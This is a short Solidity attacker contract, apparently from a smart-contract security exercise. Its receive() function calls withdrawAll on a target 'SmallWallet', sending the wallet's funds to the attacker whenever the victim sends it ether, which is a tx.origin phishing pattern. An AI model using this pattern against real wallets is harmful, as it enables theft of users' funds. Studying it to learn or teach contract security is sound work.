// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ISmallWallet {
    function withdrawAll(address _recipient) external;
}

contract SmallWalletAttacker is Ownable {
    ISmallWallet private immutable smallWallet;
    constructor(ISmallWallet _smallWallet) {
        smallWallet = _smallWallet;
    }

    receive() external payable {
        smallWallet.withdrawAll(owner());
    }
}